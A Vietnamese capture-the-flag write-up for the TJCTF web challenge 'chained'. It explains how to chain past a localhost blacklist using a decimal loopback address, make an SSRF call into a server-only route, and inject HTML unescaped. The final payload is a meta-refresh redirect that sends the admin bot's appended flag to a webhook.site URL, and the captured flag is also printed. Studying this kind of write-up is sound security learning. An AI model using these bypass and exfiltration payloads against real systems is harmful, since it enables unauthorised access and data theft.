# web/chained

## Phân tích file

Challenge cung cấp 3 file chính:

```text
index.html
app.py
admin-bot.js
```

### 1. `admin-bot.js`

```js
export default {
    id: 'chained',
    name: 'chained',
    urlRegex: /^https:\/\/chained\.tjc\.tf\/admin\//,
    timeout: 10000,
    handler: async (url, ctx) => {
        const page = await ctx.newPage();
        await page.goto(url + flag, { timeout: 3000, waitUntil: 'domcontentloaded' });
        await sleep(5000);
    }
};
```

Admin bot chỉ chấp nhận URL match regex:

```text
https://chained.tjc.tf/admin/
```

Quan trọng nhất là bot sẽ truy cập:

```js
url + flag
```

Nghĩa là flag sẽ được nối trực tiếp vào cuối URL mà mình submit cho admin bot.

### 2. `app.py`

```py
def isSafe(url):
    blacklist={'127', 'local', '2130706433', '017700000001', '::1', '0.0.0.0', '[::]', 'ffff', '0.0.0.0', '0x', '..', '%2e%2e', '@'}
    return all([i not in url.lower() for i in blacklist])
```

Ứng dụng dùng blacklist để chặn localhost, tuy nhiên có thể dùng dạng decimal khác của localhost, ví dụ:

```text
2130706434
```

Dạng này vẫn trỏ về `127.0.0.2`, thuộc loopback, nhưng không bị blacklist chặn.

Route `/admin` chỉ cho request đến từ `127.0.0.1`.

```py
@app.route('/admin')
def js():
    if request.remote_addr != '127.0.0.1': return 'Access denied. Page only accessible from server side.'
    query = request.args.get("q", "")
    return query, 200, {'Content-Type': 'application/javascript'}
```

Nếu truy cập trực tiếp từ browser bên ngoài sẽ bị chặn:

```text
Access denied. Page only accessible from server side.
```

Nhưng nếu dùng SSRF từ server gọi vào `/admin`, request sẽ được tính là local, nên bypass được check `remote_addr`.

### 3. `index.html`

```html
<h3> {{ q | safe }} </h3>
```

Response từ SSRF được render với filter `safe`, nên HTML không bị escape.

Điều này cho phép ta inject HTML vào trang thông qua response từ SSRF.

## Payload 

Payload gửi vào admin bot:

```text
https://chained.tjc.tf/admin/../?url=http%3A%2F%2F2130706434%3A5000%2Fadmin%3Fq%3D%253Cmeta%2520http-equiv%253Drefresh%2520content%253D0%253Burl%253Dhttps%253A%252F%252Fwebhook.site%252Fdde72542-7905-48e1-8dc6-d44aabfb5067%252F%253Fc%253D
```

Kiểm tra webhook, thấy request mới với query string:

![alt text](image.png)

## Flag

```text
tjctf{ch41n3d_0340e934135d}
```
